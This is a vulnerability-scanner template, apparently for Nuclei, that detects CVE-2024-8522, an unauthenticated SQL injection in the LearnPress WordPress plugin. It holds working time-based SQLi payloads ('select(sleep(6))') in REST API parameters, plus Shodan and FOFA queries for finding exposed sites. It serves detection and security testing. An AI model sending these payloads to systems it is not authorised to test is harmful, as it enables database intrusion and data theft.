flow: http(1) && http(2)
http:
- matchers:
  - dsl:
    - contains(body, "/wp-content/plugins/learnpress")
    internal: true
    type: dsl
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
- host-redirects: true
  matchers:
  - dsl:
    - duration_1>=6
    - duration_2>=6
    name: time-based
    type: dsl
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

    '
  - '@timeout: 30s

    GET /wp-json/learnpress/v1/courses?course_filter=&c_fields=post_title,(select(sleep(6))),ID&
    HTTP/1.1

    Host: {{Hostname}}

    '
  - '@timeout: 30s

    GET /wp-json/learnpress/v1/courses?course_filter=&c_only_fields=post_title,(select(sleep(6))),ID&
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2024-8522
info:
  author: pdresearch,iamnoooob,rootxharsh
  classification:
    cpe: cpe:2.3:a:thimpress:learnpress:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2024-8522
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-89
    epss-percentile: 0.91818
    epss-score: 0.04685
  description: "The LearnPress \u2013 WordPress LMS Plugin plugin for WordPress is\
    \ vulnerable to SQL Injection via the 'c_only_fields' parameter of the /wp-json/learnpress/v1/courses\
    \ REST API endpoint in all versions up to, and including, 4.2.7 due to insufficient\
    \ escaping on the user supplied parameter and lack of sufficient preparation on\
    \ the existing SQL query. This makes it possible for unauthenticated attackers\
    \ to append additional SQL queries into already existing queries that can be used\
    \ to extract sensitive information from the database.\n"
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary SQL queries, potentially leading to unauthorized accessand data
    leakage.

    '
  metadata:
    fofa-query: body="/wp-content/plugins/learnpress"
    max-request: 4
    product: learnpress
    shodan-query: html:"/wp-content/plugins/learnpress"
    vendor: thimpress
  name: "LearnPress \u2013 WordPress LMS - SQL Injection"
  reference:
  - https://github.com/advisories/GHSA-3w3r-r6g6-w8x5
  - https://nvd.nist.gov/vuln/detail/CVE-2024-8522
  severity: critical
  tags: time-based-sqli,cve,cve2024,learnpress,sqli,wp,wordpress,wp-plugin,authenticated
